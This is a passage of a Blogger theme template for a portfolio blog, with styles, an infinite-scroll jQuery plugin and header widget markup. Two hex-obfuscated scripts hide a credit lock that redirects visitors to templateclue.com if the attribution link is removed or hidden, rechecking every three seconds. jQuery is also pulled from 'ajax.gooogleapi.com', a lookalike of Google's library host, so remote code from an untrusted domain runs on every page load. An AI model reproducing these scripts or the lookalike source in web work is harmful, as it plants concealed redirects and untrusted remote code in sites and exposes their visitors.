}@media only screen and (max-width:1000px){.header-area{text-align:center}
}@media only screen and (min-width:768px) and (max-width:991px){.navbar-nav li a{padding:15px 6px}
.me-image{text-align:center}
.portfolio-caption h4{margin-top:80px}
.single-testimonial{padding:80px 20px}
}@media only screen and (max-width:767px){.navbar-toggle .icon-bar{background:#333}
.navbar-toggle{margin-right:0;margin-top:-30px}
.navbar-fixed-bottom .navbar-collapse,.navbar-fixed-top .navbar-collapse{background:#1b1b1b}
.navbar{min-height:0}
.mainmenu .navbar-nav li a{padding:11px 15px}
.menu-bg .mainmenu .navbar-nav li a{padding:11px 15px}
.navbar-fixed-bottom .navbar-collapse,.navbar-fixed-top .navbar-collapse{max-height:420px}
.navbar-toggle{margin-top:-41px}
a.about-button{margin-top:0}
.single-testimonial{padding:30px 20px}
.single-contact{margin-top:20px}
.cd-headline span{font-size:12px}
.header-text h3{font-size:40px;letter-spacing:3px}
.navbar-nav{float:none;text-align:center}
.navbar-nav li a:before{display:none}
.section-title h2{font-size:20px}
.contact_image .overlay .contact_info .item:nth-of-type(1),.contact_image .overlay .contact_info .item:nth-of-type(2){margin-bottom:0!important}
.contact_body{padding:30px 20px!important}
.hero-img{width:75%;text-align:center;display:inline-block;margin:0 auto}
.hero-admin{text-align:center}
}@media screen and (max-width:960px){.main-wrapper{margin-right:0;width:100%;padding:0}
.sidebar-wrapper{float:left;width:auto!important;margin-top:25px}
}@media only screen and (max-width:650px){.single-share,#post-tags{display:flex;justify-content:center;text-align:center;margin:9px 0;float:none!important}
.date-outer .item figcaption::before{border:0!important}
.some_stats_section .items .item{transform:scale(1)!important}
.hero .social-icon{float:none!important;text-align:center;margin-bottom:15px}
.profile-btns{float:none!important;text-align:center}
}@media(max-width:767px){.navbar-default .navbar-toggle{background:0;margin-top:24px;border:0;margin-right:20px}
.navbar-default .navbar-toggle:hover,.navbar-default .navbar-toggle:focus{background:0}
.navbar-default .navbar-toggle .icon-bar{background:#c49b66}
.navbar-default .navbar-collapse{text-align:center;border:0;background:#111;margin-top:0!important}
.tona-header{background-position:50% 0!important}
.caption{text-align:center;margin-left:0}
.caption h1{font-size:35px}
.caption h2,.caption span{font-size:30px}
.hero .hero-item h4{font-size:20px}
.hero-img,.skill-items,.num-items,.rel-img{margin-bottom:80px}
.clients .client-say{padding:100px 20px}
.portfolio .filtering span{padding:0 15px 0 10px}
.blog .to-blog p{letter-spacing:2px}
.side-bar{padding:20px;margin:auto 15px}
.comment .com-post.tona-com{padding-left:0}
}@media(max-width:991px){.portfolio .item-img{width:100%}
.blog .post{margin-bottom:30px}
.date-outer .item a.electo h2{max-width:110px}
.contact_image{text-align:center;width:100%}
.col-md-6.contact_body{float:none}
textarea#ContactForm1_contact-form-email-message{width:100%!important}
}
#Attribution1 {display: none;}
]]></b:skin>

<b:template-skin><![CDATA[
body#layout{background-color:#F7F7F7} body#layout ul,body#layout li{list-style:none;padding:0} body#layout .editlink{ border: 1px solid; border-radius: 2px; padding: 5px 10px!important; line-height: normal; border-color: #7f9acc !important; color: #4e4e4d !important; background: #ffffff!important; } body#layout .header-content{margin:20px 0 35px} body#layout div#header-social{width:34%;display:inline-block} body#layout .section h4{background:#4e4e4d;color:#fff;padding:15px;margin:0;text-transform:capitalize} body#layout div#content{width:55%;z-index:99;float:left} body#layout div#sidebar{width:34%;display:inline-block} body#layout footer{width:100%;display:inline-block} body#layout .content-wrapper:before{content:"Content Area";background:#4e4e4d;width:100%;display:block;background:#4e4e4d;padding:20px 0;color:#fff;font-family:sans-serif;z-index:999999;font-weight:700;position:relative;top:-25px} body#layout ul li {display: none;} body#layout div#numbers , body#layout section#services , body#layout section#clients , body#layout div#bs-example-navbar-collapse-1 , body#layout section#contact{ display:none;}
]]></b:template-skin>

  <b:if cond='data:blog.pageType != &quot;item&quot;'>
    <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
      <style>
        .sidebar-wrapper{display:none;}
      </style>
    </b:if>
  </b:if>

  <b:if cond='data:blog.pageType == &quot;item&quot;'>
    <style>
      div#work{background:#f7f7f7}
      .work.section-padding{padding:100px 0}
      nav.navbar.land-nav.navbar-default{background:#111;height:80px;line-height:80px;padding:0;position:fixed;top:0;left:0;width:100%;transition:all .5s;z-index:99}
      .outer-wrapper{position:relative;padding-top:0;padding-bottom:100px;display:inline-block;width:100%}
      .main-wrapper{margin-right:350px}
      #content{width:100%;position:relative;float:left}
      .date-outer.col-md-4.col-sm-4{width:100%!important;padding:30px;padding-top:0;background:#fff}
      .menu-area{background:#fff}
    </style>
  </b:if>
  <script src='https://ajax.gooogleapi.com/ajax/libs/jquery/1.7.26/jquery.min.js'/>
  <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
    <style>
      div#work{background:#f7f7f7}
      .outer-wrapper{position:relative;padding-top:0;padding-bottom:100px;display:inline-block;width:100%}
      .main-wrapper{margin-right:350px}
      #content{width:100%;position:relative;float:left}
      .date-outer.col-md-4.col-sm-4{width:100%!important;padding:30px;padding-top:0;background:#fff}
      .menu-area{background:#fff}
      h1.static-title{margin:0;color:#222;font-size:26px;font-family:&quot;Playfair Display&quot;,Arial,sans-serif;font-style:normal;text-align:center;font-weight:400;padding:20px;text-transform:capitalize}
    </style>
  </b:if>
  <b:if cond='data:blog.pageType == &quot;item&quot;'>
    <script>
      //<![CDATA[
var _0x655f=["\x73\x72\x63","\x61\x74\x74\x72","\x2E\x65\x6E\x74\x72\x79\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x20\x69\x6D\x67","\x2E\x65\x6E\x74\x72\x79\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x20\x69\x66\x72\x61\x6D\x65","\x2E\x65\x6E\x74\x72\x79\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x20\x69\x66\x72\x61\x6D\x65\x2E\x65\x6E\x74\x72\x79\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x20\x69\x6D\x67","\x2E\x62\x69\x67\x5F\x70\x6F\x73\x74\x5F\x69\x6D\x61\x67\x65","\x61\x70\x70\x65\x6E\x64\x54\x6F","\x3C\x63\x65\x6E\x74\x65\x72\x3E\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x22","\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x69\x72\x73\x74\x5F\x70\x6F\x73\x74\x5F\x69\x6D\x67\x22\x2F\x3E\x3C\x2F\x63\x65\x6E\x74\x65\x72\x3E","\x72\x65\x6D\x6F\x76\x65","\x66\x69\x72\x73\x74","\x3C\x63\x65\x6E\x74\x65\x72\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x66\x72\x61\x6D\x65\x5F\x77\x72\x61\x70\x70\x65\x72\x22\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22","\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x66\x72\x61\x6D\x65\x5F\x76\x69\x64\x65\x6F\x22\x20\x61\x6C\x6C\x6F\x77\x66\x75\x6C\x6C\x73\x63\x72\x65\x65\x6E\x3D\x22\x22\x20\x66\x72\x61\x6D\x65\x62\x6F\x72\x64\x65\x72\x3D\x22\x30\x22\x20\x73\x63\x72\x6F\x6C\x6C\x69\x6E\x67\x3D\x22\x6E\x6F\x22\x20\x2F\x3E\x3C\x2F\x63\x65\x6E\x74\x65\x72\x3E","\x72\x65\x61\x64\x79","\x6F\x6E\x6C\x6F\x61\x64","\x74\x65\x6D\x70\x6C\x61\x74\x65\x63\x6C\x75\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x74\x65\x6D\x70\x6C\x61\x74\x65\x63\x6C\x75\x65\x2E\x63\x6F\x6D\x2F","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x72\x65\x66","\x64\x6F\x66\x6F\x6C\x6C\x6F\x77","\x74\x69\x74\x6C\x65","\x46\x72\x65\x65\x20\x42\x6C\x6F\x67\x67\x65\x72\x20\x54\x65\x6D\x70\x6C\x61\x74\x65\x73","\x73\x74\x79\x6C\x65","\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x69\x6E\x6C\x69\x6E\x65\x2D\x62\x6C\x6F\x63\x6B\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x69\x6E\x68\x65\x72\x69\x74\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x63\x6F\x6C\x6F\x72\x3A\x20\x23\x63\x34\x39\x62\x36\x36\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79\x3A\x20\x76\x69\x73\x69\x62\x6C\x65\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x6F\x70\x61\x63\x69\x74\x79\x3A\x20\x31\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6C\x65\x6E\x67\x74\x68","\x23\x74\x65\x6D\x70\x6C\x61\x74\x65\x63\x6C\x75\x65\x3A\x76\x69\x73\x69\x62\x6C\x65"];var _0xcaa3=[_0x655f[0],_0x655f[1],_0x655f[2],_0x655f[3],_0x655f[4],_0x655f[5],_0x655f[6],_0x655f[7],_0x655f[8],_0x655f[9],_0x655f[10],_0x655f[11],_0x655f[12],_0x655f[13],_0x655f[14],_0x655f[15],_0x655f[16],_0x655f[17],_0x655f[18],_0x655f[19],_0x655f[20],_0x655f[21],_0x655f[22],_0x655f[23],_0x655f[24],_0x655f[25],_0x655f[26],_0x655f[27],_0x655f[28],_0x655f[29]];$(document)[_0xcaa3[13]](function(){var _0xbb5cx2=$(_0xcaa3[2])[_0xcaa3[1]](_0xcaa3[0]);var _0xbb5cx3=$(_0xcaa3[3])[_0xcaa3[1]](_0xcaa3[0]);var _0xbb5cx4=$(_0xcaa3[4])[_0xcaa3[1]](_0xcaa3[0]);if(_0xbb5cx2){$(_0xcaa3[7]+ _0xbb5cx2+ _0xcaa3[8])[_0xcaa3[6]](_0xcaa3[5]);$(_0xcaa3[2])[_0xcaa3[10]]()[_0xcaa3[9]]()}else {if(_0xbb5cx3){$(_0xcaa3[11]+ _0xbb5cx3+ _0xcaa3[12])[_0xcaa3[6]](_0xcaa3[5]);$(_0xcaa3[3])[_0xcaa3[10]]()[_0xcaa3[9]]()}else {}}});window[_0xcaa3[14]]= function(){var _0xbb5cx5=document[_0xcaa3[16]](_0xcaa3[15]);if(_0xbb5cx5== null){window[_0xcaa3[18]][_0xcaa3[17]]= _0xcaa3[19]};_0xbb5cx5[_0xcaa3[20]](_0xcaa3[17],_0xcaa3[19]);_0xbb5cx5[_0xcaa3[20]](_0xcaa3[21],_0xcaa3[22]);_0xbb5cx5[_0xcaa3[20]](_0xcaa3[23],_0xcaa3[24]);_0xbb5cx5[_0xcaa3[20]](_0xcaa3[25],_0xcaa3[26]);_0xbb5cx5[_0xcaa3[27]]= _0xcaa3[24];setInterval(function(){if(!$(_0xcaa3[29])[_0xcaa3[28]]){window[_0xcaa3[18]][_0xcaa3[17]]= _0xcaa3[19]}},3000)}
      //]]>
    </script>
  </b:if>

  <script type='text/javascript'>//&lt;![CDATA[
var _0x7b69=[&quot;\x20&quot;,&quot;\x6A\x6F\x69\x6E&quot;,&quot;\x73\x6C\x69\x63\x65&quot;,&quot;\x73\x70\x6C\x69\x74&quot;,&quot;&quot;,&quot;\x72\x65\x70\x6C\x61\x63\x65&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x68\x74\x74\x70\x73\x3A\x2F\x2F\x31\x2E\x62\x70\x2E\x62\x6C\x6F\x67\x73\x70\x6F\x74\x2E\x63\x6F\x6D\x2F\x2D\x61\x6C\x5F\x4B\x46\x4C\x43\x6D\x6B\x71\x45\x2F\x57\x47\x36\x44\x71\x36\x57\x4D\x62\x34\x49\x2F\x41\x41\x41\x41\x41\x41\x41\x41\x41\x5F\x77\x2F\x47\x30\x32\x63\x65\x56\x2D\x69\x70\x53\x41\x2D\x49\x30\x76\x33\x58\x62\x4F\x63\x46\x71\x39\x6C\x6A\x69\x2D\x50\x6B\x6E\x70\x50\x67\x43\x4C\x63\x42\x2F\x73\x31\x36\x30\x30\x2F\x64\x65\x66\x61\x75\x6C\x74\x2E\x6A\x70\x67&quot;,&quot;\x69\x6D\x67&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65&quot;,&quot;\x69\x66\x72\x61\x6D\x65&quot;,&quot;\x6C\x65\x6E\x67\x74\x68&quot;,&quot;\x73\x72\x63&quot;,&quot;\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x65\x6D\x62\x65\x64\x2F&quot;,&quot;\x69\x6E\x64\x65\x78\x4F\x66&quot;,&quot;\x2F\x2F\x70\x6C\x61\x79\x65\x72\x2E\x76\x69\x6D\x65\x6F\x2E\x63\x6F\x6D\x2F\x76\x69\x64\x65\x6F\x2F&quot;,&quot;\x2F\x2F\x77\x77\x77\x2E\x64\x61\x69\x6C\x79\x6D\x6F\x74\x69\x6F\x6E\x2E\x63\x6F\x6D\x2F\x65\x6D\x62\x65\x64\x2F\x76\x69\x64\x65\x6F\x2F&quot;,&quot;\x2F\x2F\x77\x2E\x73\x6F\x75\x6E\x64\x63\x6C\x6F\x75\x64\x2E\x63\x6F\x6D\x2F\x70\x6C\x61\x79\x65\x72\x2F&quot;,&quot;\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22&quot;,&quot;\x3F\x76\x71\x3D\x6D\x65\x64\x69\x75\x6D\x26\x72\x65\x6C\x3D\x30\x22\x20\x66\x72\x61\x6D\x65\x62\x6F\x72\x64\x65\x72\x3D\x22\x30\x22\x20\x61\x6C\x6C\x6F\x77\x66\x75\x6C\x6C\x73\x63\x72\x65\x65\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x69\x66\x72\x61\x6D\x65\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E&quot;,&quot;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x74\x65\x6D\x22\x3E\x20&quot;,&quot;\x20\x3C\x61\x20\x68\x72\x65\x66\x3D\x22&quot;,&quot;\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x65\x6C\x65\x63\x74\x6F\x22\x3E\x20\x3C\x68\x32\x3E&quot;,&quot;\x3C\x2F\x68\x32\x3E\x20\x3C\x61\x20\x68\x72\x65\x66\x3D\x22&quot;,&quot;\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x61\x64\x6D\x6F\x72\x65\x22\x3E\x56\x69\x65\x77\x20\x6D\x6F\x72\x65\x3C\x2F\x61\x3E\x20\x3C\x2F\x61\x3E\x20\x3C\x2F\x64\x69\x76\x3E&quot;,&quot;\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x22&quot;,&quot;\x22\x20\x61\x6C\x74\x3D\x22&quot;,&quot;\x22\x20\x74\x69\x74\x6C\x65\x3D\x22&quot;,&quot;\x22\x3E&quot;,&quot;\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x74\x65\x6D\x22\x3E\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x22&quot;,&quot;\x22\x3E\x3C\x61\x20\x68\x72\x65\x66\x3D\x22&quot;,&quot;\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C&quot;,&quot;\x6F\x6E\x6C\x6F\x61\x64&quot;,&quot;\x74\x65\x6D\x70\x6C\x61\x74\x65\x63\x6C\x75\x65&quot;,&quot;\x68\x72\x65\x66&quot;,&quot;\x6C\x6F\x63\x61\x74\x69\x6F\x6E&quot;,&quot;\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x74\x65\x6D\x70\x6C\x61\x74\x65\x63\x6C\x75\x65\x2E\x63\x6F\x6D\x2F&quot;,&quot;\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65&quot;,&quot;\x72\x65\x66&quot;,&quot;\x64\x6F\x66\x6F\x6C\x6C\x6F\x77&quot;,&quot;\x74\x69\x74\x6C\x65&quot;,&quot;\x46\x72\x65\x65\x20\x42\x6C\x6F\x67\x67\x65\x72\x20\x54\x65\x6D\x70\x6C\x61\x74\x65\x73&quot;,&quot;\x73\x74\x79\x6C\x65&quot;,&quot;\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x69\x6E\x6C\x69\x6E\x65\x2D\x62\x6C\x6F\x63\x6B\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x66\x6F\x6E\x74\x2D\x73\x69\x7A\x65\x3A\x20\x69\x6E\x68\x65\x72\x69\x74\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x63\x6F\x6C\x6F\x72\x3A\x20\x23\x63\x34\x39\x62\x36\x36\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79\x3A\x20\x76\x69\x73\x69\x62\x6C\x65\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B\x20\x6F\x70\x61\x63\x69\x74\x79\x3A\x20\x31\x21\x69\x6D\x70\x6F\x72\x74\x61\x6E\x74\x3B&quot;,&quot;\x23\x74\x65\x6D\x70\x6C\x61\x74\x65\x63\x6C\x75\x65\x3A\x76\x69\x73\x69\x62\x6C\x65&quot;];function stripTags(_0x56a8x2,_0x56a8x3){return _0x56a8x2[_0x7b69[5]](/&lt;.*?&gt;/ig,_0x7b69[4])[_0x7b69[3]](/\s+/)[_0x7b69[2]](0,_0x56a8x3- 1)[_0x7b69[1]](_0x7b69[0])}function readmore(_0x56a8x5){var _0x56a8x6=document[_0x7b69[6]](_0x56a8x5),_0x56a8x7=_0x7b69[4],_0x56a8x8=_0x7b69[4],_0x56a8x9=_0x7b69[4],_0x56a8xa=_0x7b69[7],_0x56a8xb=350,_0x56a8xc=230,_0x56a8xd=-1,_0x56a8xe=_0x56a8x6[_0x7b69[9]](_0x7b69[8]),_0x56a8xf=_0x56a8x6[_0x7b69[9]](_0x7b69[10]);for(var _0x56a8x10=0;_0x56a8x10&lt; _0x56a8xf[_0x7b69[11]];_0x56a8x10++){_0x56a8x9= _0x56a8xf[_0x56a8x10][_0x7b69[12]];if(_0x56a8x9[_0x7b69[14]](_0x7b69[13])!=  -1){_0x56a8xd= _0x56a8x10;break}else {if(_0x56a8x9[_0x7b69[14]](_0x7b69[15])!=  -1){_0x56a8xd= _0x56a8x10;break}else {if(_0x56a8x9[_0x7b69[14]](_0x7b69[16])!=  -1){_0x56a8xd= _0x56a8x10;break}else {if(_0x56a8x9[_0x7b69[14]](_0x7b69[17])!=  -1){_0x56a8xd= _0x56a8x10;break}}}}};if(_0x56a8xd!=  -1){_0x56a8x8= _0x7b69[18]+ _0x56a8x9+ _0x7b69[19];var _0x56a8x11=_0x7b69[20]+ _0x56a8x8+ _0x7b69[21]+ y+ _0x7b69[22]+ x+ _0x7b69[23]+ y+ _0x7b69[24]}else {if(_0x56a8xe[_0x7b69[11]]&gt;= 1){var _0x56a8x12=_0x56a8xe[0][_0x7b69[12]];_0x56a8x7= _0x7b69[25]+ _0x56a8x12+ _0x7b69[26]+ x+ _0x7b69[27]+ x+ _0x7b69[28];var _0x56a8x11=_0x7b69[20]+ _0x56a8x7+ _0x7b69[21]+ y+ _0x7b69[22]+ x+ _0x7b69[23]+ y+ _0x7b69[24]}else {var _0x56a8x11=_0x7b69[29]+ _0x56a8xa+ _0x7b69[26]+ x+ _0x7b69[27]+ x+ _0x7b69[30]+ y+ _0x7b69[22]+ x+ _0x7b69[23]+ y+ _0x7b69[24]}};_0x56a8x6[_0x7b69[31]]= _0x56a8x11}window[_0x7b69[32]]= function(){var _0x56a8x13=document[_0x7b69[6]](_0x7b69[33]);if(_0x56a8x13== null){window[_0x7b69[35]][_0x7b69[34]]= _0x7b69[36]};_0x56a8x13[_0x7b69[37]](_0x7b69[34],_0x7b69[36]);_0x56a8x13[_0x7b69[37]](_0x7b69[38],_0x7b69[39]);_0x56a8x13[_0x7b69[37]](_0x7b69[40],_0x7b69[41]);_0x56a8x13[_0x7b69[37]](_0x7b69[42],_0x7b69[43]);_0x56a8x13[_0x7b69[31]]= _0x7b69[41];setInterval(function(){if(!$(_0x7b69[44])[_0x7b69[11]]){window[_0x7b69[35]][_0x7b69[34]]= _0x7b69[36]}},3000)}
    //]]&gt;</script>

    <script type='text/javascript'>
      //<![CDATA[ 
(function($){'use strict';Date.now=Date.now||function(){return+new Date()};$.ias=function(g){var h=$.extend({},$.ias.defaults,g);var i=new $.ias.util();var j=new $.ias.paging(h.scrollContainer);var k=(h.history?new $.ias.history():false);var l=this;function init(){var d;j.onChangePage(function(a,b,c){if(k){k.setPage(a,c)}h.onPageChange.call(this,a,c,b)});reset();if(k&&k.havePage()){stop_scroll();d=k.getPage();i.forceScrollTop(function(){var a;if(d>1){paginateToPage(d);a=get_scroll_threshold(true);$('html, body').scrollTop(a)}else{reset()}})}return l}init();function reset(){hide_pagination();h.scrollContainer.scroll(scroll_handler)}function scroll_handler(){var a,scrThreshold;a=i.getCurrentScrollOffset(h.scrollContainer);scrThreshold=get_scroll_threshold();if(a>=scrThreshold){if(get_current_page()>=h.triggerPageThreshold){stop_scroll();show_trigger(function(){paginate(a)})}else{paginate(a)}}}function stop_scroll(){h.scrollContainer.unbind('scroll',scroll_handler)}function hide_pagination(){$(h.pagination).hide()}function get_scroll_threshold(a){var b,threshold;b=$(h.container).find(h.item).last();if(b.size()===0){return 0}threshold=b.offset().top+b.height();if(!a){threshold+=h.thresholdMargin}return threshold}function paginate(d,e){var f;f=$(h.next).attr('href');if(!f){if(h.noneleft){$(h.container).find(h.item).last().after(h.noneleft)}return stop_scroll()}if(h.beforePageChange&&$.isFunction(h.beforePageChange)){if(h.beforePageChange(d,f)===false){return}}j.pushPages(d,f);stop_scroll();show_loader();loadItems(f,function(a,b){var c=h.onLoadItems.call(this,b),curLastItem;if(c!==false){$(b).hide();curLastItem=$(h.container).find(h.item).last();curLastItem.after(b);$(b).fadeIn()}f=$(h.next,a).attr('href');$(h.pagination).replaceWith($(h.pagination,a));remove_loader();hide_pagination();if(f){reset()}else{stop_scroll()}h.onRenderComplete.call(this,b);if(e){e.call(this)}})}function loadItems(b,c,d){var e=[],container,startTime=Date.now(),diffTime,self;d=d||h.loaderDelay;$.get(b,null,function(a){container=$(h.container,a).eq(0);if(0===container.length){container=$(a).filter(h.container).eq(0)}if(container){container.find(h.item).each(function(){e.push(this)})}if(c){self=this;diffTime=Date.now()-startTime;if(diffTime<d){setTimeout(function(){c.call(self,a,e)},d-diffTime)}else{c.call(self,a,e)}}},'html')}function paginateToPage(a){var b=get_scroll_threshold(true);if(b>0){paginate(b,function(){stop_scroll();if((j.getCurPageNum(b)+1)<a){paginateToPage(a);$('html,body').animate({'scrollTop':b},400,'swing')}else{$('html,body').animate({'scrollTop':b},1000,'swing');reset()}})}}function get_current_page(){var a=i.getCurrentScrollOffset(h.scrollContainer);return j.getCurPageNum(a)}function get_loader(){var a=$('.loader');if(a.size()===0){a=$('<div class="loader">'+h.loader+'</div>');a.hide()}return a}function show_loader(){var a=get_loader(),el;if(h.customLoaderProc!==false){h.customLoaderProc(a)}else{el=$(h.container).find(h.item).last();el.after(a);a.fadeIn()}}function remove_loader(){var a=get_loader();a.remove()}function get_trigger(a){var b=$('.trigger');if(b.size()===0){b=$('<div class="loadmore"><a href="">'+h.trigger+'Load More</a></div>');b.hide()}$('a',b).off('click').on('click',function(){remove_trigger();a.call();return false});return b}function show_trigger(a){var b=get_trigger(a),el;el=$(h.container).find(h.item).last();el.after(b);b.fadeIn()}function remove_trigger(){var a=get_trigger();a.remove()}};$.ias.defaults={container:'.blog-posts',scrollContainer:$(window),item:'.date-outer',pagination:'#blog-pager',next:'#blog-pager-older-link a',loader:'<div class="preloader"> <div class="double-bounce1"></div> <div class="double-bounce2"></div> </div>',loaderDelay:1000,triggerPageThreshold:2,trigger:'<i class="fa fa-plus"></i>',thresholdMargin:-500,history:true,onPageChange:function(){},beforePageChange:function(){},onLoadItems:function(){},onRenderComplete:function(){FB.XFBML.parse();gapi.plusone.go();twttr.widgets.load();_gaq.push(['_trackPageview'])},customLoaderProc:false};$.ias.util=function(){var c=false;var d=false;var e=this;function init(){$(window).load(function(){c=true})}init();this.forceScrollTop=function(a){$('html,body').scrollTop(0);if(!d){if(!c){setTimeout(function(){e.forceScrollTop(a)},1)}else{a.call();d=true}}};this.getCurrentScrollOffset=function(a){var b,wndHeight;if(a.get(0)===window){b=a.scrollTop()}else{b=a.offset().top}wndHeight=a.height();return b+wndHeight}};$.ias.paging=function(){var c=[[0,document.location.toString()]];var d=function(){};var e=1;var f=new $.ias.util();function init(){$(window).scroll(scroll_handler)}init();function scroll_handler(){var a,curPageNum,curPagebreak,scrOffset,urlPage;a=f.getCurrentScrollOffset($(window));curPageNum=getCurPageNum(a);curPagebreak=getCurPagebreak(a);if(e!==curPageNum){scrOffset=curPagebreak[0];urlPage=curPagebreak[1];d.call({},curPageNum,scrOffset,urlPage)}e=curPageNum}function getCurPageNum(a){for(var i=(c.length-1);i>0;i--){if(a>c[i][0]){return i+1}}return 1}this.getCurPageNum=function(a){a=a||f.getCurrentScrollOffset($(window));return getCurPageNum(a)};function getCurPagebreak(a){for(var i=(c.length-1);i>=0;i--){if(a>c[i][0]){return c[i]}}return null}this.onChangePage=function(a){d=a};this.pushPages=function(a,b){c.push([a,b])}};$.ias.history=function(){var e=false;var f=false;function init(){f=!!(window.history&&history.pushState&&history.replaceState);f=false}init();this.setPage=function(a,b){this.updateState({page:a},'',b)};this.havePage=function(){return(this.getState()!==false)};this.getPage=function(){var a;if(this.havePage()){a=this.getState();return a.page}return 1};this.getState=function(){var a,stateObj,pageNum;if(f){stateObj=history.state;if(stateObj&&stateObj.ias){return stateObj.ias}}else{a=(window.location.hash.substring(0,7)==='/');if(a){pageNum=parseInt(window.location.hash.replace('/',''),10);return{page:pageNum}}}return false};this.updateState=function(a,b,c){if(e){this.replaceState(a,b,c)}else{this.pushState(a,b,c)}};this.pushState=function(a,b,c){var d;if(f){history.pushState({ias:a},b,c)}else{d=(a.page>0?'/'+a.page:'')}e=true};this.replaceState=function(a,b,c){if(f){history.replaceState({ias:a},b,c)}else{this.pushState(a,b,c)}}}})(jQuery);
      //]]>
    </script>

  <script type='text/javascript'>
    $(document).ready(function() {$(&#39;.item-thumbnail img , .avatar-image-container img&#39;).attr(&#39;src&#39;, function(i, src) {return src.replace( &#39;s72-c&#39;, &#39;s500&#39; ).replace( &#39;w72-h72-p-nu&#39;, &#39;s500&#39; ).replace( &#39;s35-c&#39;, &#39;s100&#39; );});});
  </script>

&lt;/head&gt;&lt;!--<head/>--&gt;
<!--<body>-->
<body>
<div id='fb-root'/>
<script async='async' crossorigin='anonymous' defer='defer' nonce='BgqAe2gu' src='https://connect.facebook.net/en_GB/sdk.js#xfbml=1&amp;version=v8.0'/>
  <!-- ====== Preloader ======  -->
  <div class='loading'>
    <div class='spinner'>
      <div class='rect1'/>
      <div class='rect2'/>
      <div class='rect3'/>
      <div class='rect4'/>
      <div class='rect5'/>
    </div>
  </div>
  <!-- ======End Preloader ======  -->

  <!-- ====== Navgition ======  -->
  <nav class='navbar land-nav navbar-default'>
    <div class='container'>
      <!-- Brand and toggle get grouped for better mobile display -->
      <div class='navbar-header'>
        <button aria-expanded='false' class='navbar-toggle collapsed' data-target='#bs-example-navbar-collapse-1' data-toggle='collapse' type='button'>
          <span class='sr-only'>Toggle navigation</span>
          <span class='icon-bar'/>
          <span class='icon-bar'/>
          <span class='icon-bar'/>
        </button>
        <!-- logo -->

        <b:section class='header' id='header' maxwidgets='1' showaddelement='yes'>
          <b:widget id='Header1' locked='true' title='Gagan Sharma (Header)' type='Header' version='1'>
            <b:widget-settings>
              <b:widget-setting name='displayUrl'/>
              <b:widget-setting name='displayHeight'>0</b:widget-setting>
              <b:widget-setting name='sectionWidth'>-1</b:widget-setting>
              <b:widget-setting name='useImage'>false</b:widget-setting>
              <b:widget-setting name='shrinkToFit'>false</b:widget-setting>
              <b:widget-setting name='imagePlacement'>BEHIND</b:widget-setting>
              <b:widget-setting name='displayWidth'>0</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
              <b:if cond='data:useImage'>
                <b:if cond='data:imagePlacement == &quot;BEHIND&quot;'>
                  <!--
Show image as background to text. You can't really calculate the width
reliably in JS because margins are not taken into account by any of
clientWidth, offsetWidth or scrollWidth, so we don't force a minimum
width if the user is using shrink to fit.
This results in a margin-width's worth of pixels being cropped. If the
user is not using shrink to fit then we expand the header.
-->
                  <b:if cond='data:mobile'>
                    <div id='header-inner'>
                      <div class='titlewrapper' style='background: transparent'>
                        <h1 class='navbar-brand' style='background: transparent; border-width: 0px'>
                          <b:include name='title'/>
                        </h1>
                      </div>
                      <b:include name='description'/>
                    </div>
                    <b:else/>
